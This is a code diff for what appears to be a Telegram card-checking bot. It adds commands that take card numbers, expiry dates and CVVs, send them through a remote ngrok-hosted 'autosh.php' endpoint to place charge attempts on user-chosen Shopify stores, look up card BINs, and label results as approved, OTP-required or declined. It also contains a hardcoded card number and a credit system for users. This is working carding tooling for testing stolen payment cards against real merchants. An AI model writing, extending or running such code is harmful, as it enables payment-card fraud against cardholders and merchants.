@@ -7,6 +7,8 @@ import threading
 import concurrent.futures
 import re
 from datetime import datetime, timedelta
+import os
+from urllib.parse import urlparse
 
 #====================Gateway Files===================================#
 from chk import check_card
@@ -107,6 +109,36 @@ def deduct_credits(user_id, amount):
         save_users(users)
         return True
     return False
+
+# Add this near the top with other constants
+USER_SITES_FILE = "user_sites.json"
+
+# Add this with other initialization code
+USER_SITES = {}
+if os.path.exists(USER_SITES_FILE):
+    with open(USER_SITES_FILE, 'r') as f:
+        USER_SITES = json.load(f)
+
+def save_user_sites():
+    with open(USER_SITES_FILE, 'w') as f:
+        json.dump(USER_SITES, f)
+
+# Status texts and emojis (add with other status constants)
+status_emoji = {
+    'APPROVED': '🔥',
+    'APPROVED_OTP': '❎',
+    'DECLINED': '❌',
+    'EXPIRED': '👋',
+    'ERROR': '⚠️'
+}
+
+status_text = {
+    'APPROVED': '𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝',
+    'APPROVED_OTP': '𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝',
+    'DECLINED': '𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝',
+    'EXPIRED': '𝐄𝐱𝐩𝐢𝐫𝐞𝐝',
+    'ERROR': '𝐄𝐫𝐫𝐨𝐫'
+}
 
 # Get BIN info
 def get_bin_info(bin_number):
@@ -1391,6 +1423,394 @@ def handle_mat(message):
 
     except Exception as e:
         bot.reply_to(message, f"❌ An error occurred: {str(e)}")
+
+def test_shopify_site(url):
+    """Test if a Shopify site is reachable and working with a test card"""
+    try:
+        # Use the fixed test card instead of generating random one
+        test_card = "5547300001996183|11|2028|197"
+        
+        api_url = f"https://7feeef80303d.ngrok-free.app/autosh.php?cc={test_card}&site={url}"
+        response = requests.get(api_url, timeout=30)
+        
+        if response.status_code != 200:
+            return False, "Site not reachable", "0.0", "shopify_payments", "No response"
+            
+        response_text = response.text
+        
+        # Parse response
+        price = "1.0"  # default
+        gateway = "shopify_payments"  # default
+        api_message = "No response"
+        
+        try:
+            if '"Response":"' in response_text:
+                api_message = response_text.split('"Response":"')[1].split('"')[0]
+            if '"Price":"' in response_text:
+                price = response_text.split('"Price":"')[1].split('"')[0]
+            if '"Gateway":"' in response_text:
+                gateway = response_text.split('"Gateway":"')[1].split('"')[0]
+        except:
+            pass
+            
+        return True, api_message, price, gateway, "Site is reachable and working"
+        
+    except Exception as e:
+        return False, f"Error testing site: {str(e)}", "0.0", "shopify_payments", "Error"
+
+@bot.message_handler(commands=['seturl'])
+def handle_seturl(message):
+    try:
+        user_id = str(message.from_user.id)
+        parts = message.text.split(maxsplit=1)
+        
+        if len(parts) < 2:
+            bot.reply_to(message, "Usage: /seturl <your_shopify_site_url>")
+            return
+            
+        url = parts[1].strip()
+        
+        # Validate URL format
+        if not url.startswith(('http://', 'https://')):
+            url = 'https://' + url
+            
+        # Check if URL is valid Shopify site
+        status_msg = bot.reply_to(message, f"🔄 Adding URL: <code>{url}</code>\nTesting reachability...", parse_mode='HTML')
+        
+        # Phase 1: Basic URL check
+        try:
+            parsed = urlparse(url)
+            if not parsed.netloc:
+                raise ValueError("Invalid URL format")
+        except Exception as e:
+            bot.edit_message_text(chat_id=message.chat.id,
+                                message_id=status_msg.message_id,
+                                text=f"❌ Invalid URL format: {str(e)}")
+            return
+            
+        # Phase 2: Test reachability
+        bot.edit_message_text(chat_id=message.chat.id,
+                            message_id=status_msg.message_id,
+                            text=f"🔄 Testing URL: <code>{url}</code>\nTesting with test card...",
+                            parse_mode='HTML')
+        
+        # Phase 3: Test with test card
+        is_valid, api_message, price, gateway, test_message = test_shopify_site(url)
+        if not is_valid:
+            bot.edit_message_text(chat_id=message.chat.id,
+                                message_id=status_msg.message_id,
+                                text=f"❌ Failed to verify Shopify site:\n{test_message}\nPlease check your URL and try again.")
+            return
+            
+        # Store the URL with price
+        USER_SITES[user_id] = {
+            'url': url,
+            'price': price
+        }
+        save_user_sites()
+        
+        bot.edit_message_text(chat_id=message.chat.id,
+                            message_id=status_msg.message_id,
+                            text=f"""
+┏━━━━━━━⍟
+┃ 𝗦𝗶𝘁𝗲 𝗔𝗱𝗱𝗲𝗱 ✅
+┗━━━━━━━━━━━⊛
+                            
+❖ 𝗦𝗶𝘁𝗲 ➳ <code>{url}</code>
+❖ 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ➳ {api_message}
+❖ 𝗔𝗺𝗼𝘂𝗻𝘁 ➳ ${price}
+
+<i>You can now check cards with /sh command</i>
+─────── ⸙ ────────
+""",
+                            parse_mode='HTML')
+        
+    except Exception as e:
+        bot.reply_to(message, f"Error: {str(e)}")
+
+@bot.message_handler(commands=['rmurl'])
+def handle_rmurl(message):
+    try:
+        user_id = str(message.from_user.id)
+        
+        if user_id not in USER_SITES:
+            bot.reply_to(message, "You don't have any site to remove. Add a site with /seturl")
+            return
+            
+        del USER_SITES[user_id]
+        save_user_sites()
+        bot.reply_to(message, "✅ Your Shopify site has been removed successfully.")
+        
+    except Exception as e:
+        bot.reply_to(message, f"Error: {str(e)}")
+
+@bot.message_handler(commands=['myurl'])
+def handle_myurl(message):
+    try:
+        user_id = str(message.from_user.id)
+        
+        if user_id not in USER_SITES:
+            bot.reply_to(message, "You haven't added any site yet. Add a site with /seturl <your_shopify_url>")
+            return
+            
+        site_info = USER_SITES[user_id]
+        bot.reply_to(message, f"""Your Shopify site details:
+
+URL: <code>{site_info['url']}</code>
+Default Amount: ${site_info.get('price', '1.0')}
+
+Use /sh command to check cards""", parse_mode='HTML')
+        
+    except Exception as e:
+        bot.reply_to(message, f"Error: {str(e)}")
+
+def check_shopify_cc(cc, site_info):
+    try:
+        # Normalize card input
+        card = cc.replace('/', '|').replace(':', '|').replace(' ', '|')
+        parts = [x.strip() for x in card.split('|') if x.strip()]
+        
+        if len(parts) < 4:
+            return {
+                'status': 'ERROR', 
+                'card': cc, 
+                'message': 'Invalid format',
+                'brand': 'UNKNOWN', 
+                'country': 'UNKNOWN 🇺🇳', 
+                'type': 'UNKNOWN',
+                'gateway': f"Self Shopify [${site_info.get('price', '1.0')}]",
+                'price': site_info.get('price', '1.0')
+            }
+
+        cc_num, mm, yy_raw, cvv = parts[:4]
+        mm = mm.zfill(2)
+        yy = yy_raw[2:] if yy_raw.startswith("20") and len(yy_raw) == 4 else yy_raw
+        formatted_cc = f"{cc_num}|{mm}|{yy}|{cvv}"
+
+        # Get BIN info
+        brand = country_name = card_type = bank = 'UNKNOWN'
+        country_flag = '🇺🇳'
+        try:
+            bin_data = requests.get(f"https://bins.antipublic.cc/bins/{cc_num[:6]}", timeout=5).json()
+            brand = bin_data.get('brand', 'UNKNOWN')
+            country_name = bin_data.get('country_name', 'UNKNOWN')
+            country_flag = bin_data.get('country_flag', '🇺🇳')
+            card_type = bin_data.get('type', 'UNKNOWN')
+            bank = bin_data.get('bank', 'UNKNOWN')
+        except:
+            pass
+
+        # Make API request
+        api_url = f"https://7feeef80303d.ngrok-free.app/autosh.php?cc={formatted_cc}&site={site_info['url']}"
+        response = requests.get(api_url, timeout=30)
+        
+        if response.status_code != 200:
+            return {
+                'status': 'ERROR',
+                'card': formatted_cc,
+                'message': f'API Error: {response.status_code}',
+                'brand': brand,
+                'country': f"{country_name} {country_flag}",
+                'type': card_type,
+                'gateway': f"Self Shopify [${site_info.get('price', '1.0')}]",
+                'price': site_info.get('price', '1.0')
+            }
+
+        # Parse response text
+        response_text = response.text
+        
+        # Default values
+        api_message = 'No response'
+        price = site_info.get('price', '1.0')
+        gateway = 'shopify_payments'
+        status = 'DECLINED'
+        
+        # Extract data from response text
+        try:
+            if '"Response":"' in response_text:
+                api_message = response_text.split('"Response":"')[1].split('"')[0]
+                
+                # Process response according to new rules
+                response_upper = api_message.upper()
+                if 'THANK YOU' in response_upper:
+                    bot_response = 'ORDER CONFIRM!'
+                    status = 'APPROVED'
+                elif '3DS' in response_upper:
+                    bot_response = 'OTP_REQUIRED'
+                    status = 'APPROVED_OTP'
+                elif 'EXPIRED_CARD' in response_upper:
+                    bot_response = 'EXPIRE_CARD'
+                    status = 'EXPIRED'
+                elif any(x in response_upper for x in ['INSUFFICIENT_FUNDS', 'INCORRECT_CVC', 'INCORRECT_ZIP']):
+                    bot_response = api_message
+                    status = 'APPROVED_OTP'
+                else:
+                    bot_response = api_message
+            else:
+                bot_response = api_message
+                
+            if '"Price":"' in response_text:
+                price = response_text.split('"Price":"')[1].split('"')[0]
+            if '"Gateway":"' in response_text:
+                gateway = response_text.split('"Gateway":"')[1].split('"')[0]
+        except Exception as e:
+            bot_response = f"Error parsing response: {str(e)}"
+        
+        return {
+            'status': status,
+            'card': formatted_cc,
+            'message': bot_response,
+            'brand': brand,
+            'country': f"{country_name} {country_flag}",
+            'type': card_type,
+            'gateway': f"Self Shopify [${price}]",
+            'price': price
+        }
+            
+    except Exception as e:
+        return {
+            'status': 'ERROR',
+            'card': cc,
+            'message': f'Exception: {str(e)}',
+            'brand': 'UNKNOWN',
+            'country': 'UNKNOWN 🇺🇳',
+            'type': 'UNKNOWN',
+            'gateway': f"Self Shopify [${site_info.get('price', '1.0')}]",
+            'price': site_info.get('price', '1.0')
+        }
+
+def format_shopify_response(result, user_full_name, processing_time):
+    user_id_str = str(result.get('user_id', ''))
+    
+    # Determine user status
+    if user_id_str == "7820713047":
+        user_status = "Owner"
+    elif user_id_str in ADMIN_IDS:
+        user_status = "Admin"
+  
+    else:
+        user_status = "Free"
+
+    response = f"""
+┏━━━━━━━⍟
+┃ {status_text[result['status']]} {status_emoji[result['status']]}
+┗━━━━━━━━━━━⊛
+
+⌯ 𝗖𝗮𝗿𝗱
+   ↳ <code>{result['card']}</code>
+⌯ 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➳ <i>{result['gateway']}</i>  
+⌯ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➳ <i>{result['message']}</i>
+
+⌯ 𝗜𝗻𝗳𝗼 ➳ {result['brand']}
+⌯ 𝐈𝐬𝐬𝐮𝐞𝐫 ➳ {result['type']}
+⌯ 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ➳ {result['country']}
+
+⌯ 𝐑𝐞𝐪𝐮𝐞𝐬𝐭 𝐁𝐲 ➳ {user_full_name}[{user_status}]
+⌯ 𝐃𝐞𝐯 ⌁ <a href='tg://user?id=6521162324'>⎯꯭𖣐᪵‌𐎓⏤‌‌𝐃𝐚𝐫𝐤𝐛𝐨𝐲◄⏤‌‌ꭙ‌‌⁷ ꯭</a>
+⌯ 𝗧𝗶𝗺𝗲 ➳ {processing_time:.2f} 𝐬𝐞𝐜𝐨𝐧𝐝
+"""
+    return response
+
+@bot.message_handler(commands=['sh'])
+@bot.message_handler(func=lambda m: m.text and m.text.startswith('.sh'))
+def handle_sh(message):
+    user_id = message.from_user.id
+    init_user(user_id, message.from_user.username)
+    if not use_credits(user_id):
+        bot.reply_to(message, "❌ You don't have enough credits. Wait for your credits to reset.")
+        return
+
+    command_parts = message.text.split()
+    if len(command_parts) < 2:
+        bot.reply_to(message, "Please provide CC details in format: CC|MM|YY|CVV")
+        return
+
+    cc = command_parts[1]
+    if '|' not in cc:
+        bot.reply_to(message, "Invalid format. Use: CC|MM|YY|CVV")
+        return
+    # Check if user has set a URL
+    user_id = str(message.from_user.id)
+    if user_id not in USER_SITES:
+        bot.reply_to(message, "❌ You haven't added any site yet. Add a site with /seturl <your_shopify_url>\nUse /myurl to view your site details")
+        return
+
+    try:
+        # Extract card from either format
+        cc = None
+        
+        # Check if command is empty (either '/sh' or '.sh' without arguments)
+        if (message.text.startswith('/sh') and len(message.text.split()) == 1) or \
+           (message.text.startswith('.sh') and len(message.text.strip()) == 3):
+            
+            # Check if this is a reply to another message
+            if message.reply_to_message:
+                # Search for CC in replied message text
+                replied_text = message.reply_to_message.text
+                # Try to find CC in common formats
+                cc_pattern = r'\b(?:\d[ -]*?){13,16}\b'
+                matches = re.findall(cc_pattern, replied_text)
+                if matches:
+                    # Clean the CC (remove spaces and dashes)
+                    cc = matches[0].replace(' ', '').replace('-', '')
+                    # Check if we have full card details (number|mm|yyyy|cvv)
+                    details_pattern = r'(\d+)[\|/](\d+)[\|/](\d+)[\|/](\d+)'
+                    details_match = re.search(details_pattern, replied_text)
+                    if details_match:
+                        cc = f"{details_match.group(1)}|{details_match.group(2)}|{details_match.group(3)}|{details_match.group(4)}"
+        else:
+            # Normal processing for commands with arguments
+            if message.text.startswith('/'):
+                parts = message.text.split()
+                if len(parts) < 2:
+                    bot.reply_to(message, "❌ Invalid format. Use /sh CC|MM|YYYY|CVV or .sh CC|MM|YYYY|CVV")
+                    return
+                cc = parts[1]
+            else:  # starts with .
+                cc = message.text[4:].strip()  # remove ".sh "
+
+        if not cc:
+            bot.reply_to(message, "❌ No card found. Either provide CC details after command or reply to a message containing CC details.")
+            return
+
+        start_time = time.time()
+
+        user_full_name = message.from_user.first_name
+        if message.from_user.last_name:
+            user_full_name += " " + message.from_user.last_name
+
+        status_msg = bot.reply_to(
+            message,
+            f"↯ Checking..\n\n⌯ 𝐂𝐚𝐫𝐝 - <code>{cc}</code>\n⌯ 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 -  <i>Self Shopify [${USER_SITES[user_id].get('price', '1.0')}]</i> \n⌯ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 - <i>Processing</i>",
+            parse_mode='HTML'
+        )
+
+        def check_card():
+            try:
+                result = check_shopify_cc(cc, USER_SITES[user_id])
+                result['user_id'] = message.from_user.id
+                processing_time = time.time() - start_time
+                response_text = format_shopify_response(result, user_full_name, processing_time)
+
+                bot.edit_message_text(
+                    chat_id=message.chat.id,
+                    message_id=status_msg.message_id,
+                    text=response_text,
+                    parse_mode='HTML'
+                )
+
+            except Exception as e:
+                bot.edit_message_text(
+                    chat_id=message.chat.id,
+                    message_id=status_msg.message_id,
+                    text=f"❌ An error occurred: {str(e)}"
+                )
+
+        threading.Thread(target=check_card).start()
+
+    except Exception as e:
+        bot.reply_to(message, f"❌ Error: {str(e)}")
+
 
 # Handle /gate command
 def check_gate_url(url):
